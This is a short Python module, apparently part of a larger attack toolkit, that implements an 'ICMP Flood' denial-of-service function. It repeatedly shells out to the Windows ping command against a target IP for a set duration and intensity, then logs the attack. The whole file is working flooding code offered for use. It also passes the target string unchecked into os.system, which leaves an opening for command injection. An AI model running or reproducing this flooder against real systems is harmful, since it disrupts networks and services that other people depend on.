import os
import time
from app.logger import log_attack

def attack(target_ip, target_port, duration, intensity, packet_size=64, headers=None, spoof_ip=None):
    """
    Perform an ICMP Flood attack by sending repeated ping requests.

    :param target_ip: Target machine's IP address.
    :param target_port: Target port (not used for ICMP).
    :param duration: Attack duration in seconds.
    :param intensity: Number of ping packets per loop iteration.
    :param packet_size: Size of ICMP packet (default: 64 bytes).
    """
    start_time = time.time()
    while time.time() - start_time < duration:
        for _ in range(intensity):
            # Use Windows-specific ping command
            os.system(f"ping -n 1 -l {packet_size} {target_ip} > NUL 2>&1")

    # Log the attack
    log_attack("ICMP Flood", target_ip, target_port, duration, intensity)